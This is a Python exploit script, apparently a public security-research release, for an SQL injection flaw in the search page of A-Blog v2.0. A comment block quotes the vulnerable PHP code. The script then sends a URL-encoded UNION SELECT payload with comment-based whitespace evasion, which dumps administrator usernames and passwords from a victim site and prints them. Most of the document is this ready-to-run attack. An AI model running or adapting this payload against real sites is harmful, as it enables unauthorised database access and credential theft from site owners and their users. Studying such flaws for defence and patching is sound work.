#!/usr/bin/python
#
# Exploit Title:   A-Blog v2.0 (sources/search.php) SQL Injection Exploit
# Date         :   05 September 2010
# Author       :   Ptrace Security (Gianni Gnesa [gnix])
# Contact      :   research[at]ptrace-security[dot]com
# Software Link:   http://sourceforge.net/projects/a-blog/
# Version      :   2.0
# Tested on    :   EasyPHP 5.3.1.0 for Windows with Python 3.1 
#
#
# Description
# ===========
#
# + sources/search.php => This few lines of code strip whitespaces from the
#                         beginning and end of the 'words' GET parameter. Then,
#                         all the whitespaces are replaced with %.
#
# 12: if ((array_key_exists('words', $_GET)) && ($_GET['words'] == '')) {
# 13: callback_js("page=results&words=$searchwords");
# 14: }
# 15: 
# 16: else{
# 17: if ((array_key_exists('words', $_GET))) {
# 18: $words2 = trim($_GET['words']);
# 19: }
# 20: $search = str_replace(" ", "%", "$words2");
# 21: }
#
#
# + sources/search.php => The string returned from the previous code is used in
#                         the query below without being sanitized.
#
# 33: $sql = "SELECT * FROM site_news WHERE title LIKE '%$search%' OR home_text
#     LIKE '%$search%' OR extended_text LIKE '%$search%'";
# 34: $sql_result = mysql_query($sql,$connection) or die ("Couldnt execute query");
#
#
# + sources/search.php => Then, the results are echoed
#
# 39: while($row = mysql_fetch_array($sql_result)){
# 40: 
# 41: 	$id = $row['nid'];
# 42: 	$title = $row['title'];
# 43: 	$home = $row['home_text'];
# 44: 	$extended = $row['extended_text'];
# 45: 	
# 46: 	echo "<li><a href='blog.php?view=news&id=$id' title='Read $title'>$title</a></li>";
# 47: }
#

import re
import sys
import textwrap
import http.client


def usage(program):
    print('Usage  : ' + program + ' <victim hostname> <path>\n')
    print('Example: ' + program + ' localhost /A-BlogV2/')
    print('         ' + program + ' www.victim.com /complete/path/')
    return


def removeDuplicates(mylist):
    d = {}
    for elem in mylist:
        d[elem] = 1
    return list(d.keys())


def exploit(target, path):
    payload  = 'search.php?words=%25%27/%2A%2A/UNION/%2A%2A/SELECT/%2A%2A/1%2C'
    payload += 'CONCAT%28%27%3C1%3E%27%2Cname%2C%27%3A%27%2Cpassword%2C%27%3C2'
    payload += '%3E%27%29%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10/%2A%2A/FROM/%2A%2A/'
    payload += 'site_administrators/%2A%2A/%23'

    print('[+] Sending HTTP request\n')
    print(textwrap.fill('GET ' + path + payload) + '\n')
    con = http.client.HTTPConnection(target)
    con.request('GET', path + payload)
    res = con.getresponse()

    if res.status != 200:
        print('[!] HTTP GET request failed')
        exit(1)

    print('[+] Parsing HTTP response')
    data = res.read().decode()
    pattern = re.compile(r"<1>([\w:]+?)<2>", re.M)
    credentials = removeDuplicates(pattern.findall(data))

    if len(credentials) > 0:
        print('[+] Credentials found\n') 
        for element in credentials:
            print(element)
    else:
        print('[!] Credentials not found')
    
    return



print('\n+---------------------------------------------------------------------------+')
print('| A-Blog v2.0 (sources/search.php) SQL Injection Exploit by Ptrace Security |')
print('+---------------------------------------------------------------------------+\n')

if len(sys.argv) != 3:
    usage(sys.argv[0])
else:
    exploit(sys.argv[1], sys.argv[2])

exit(0)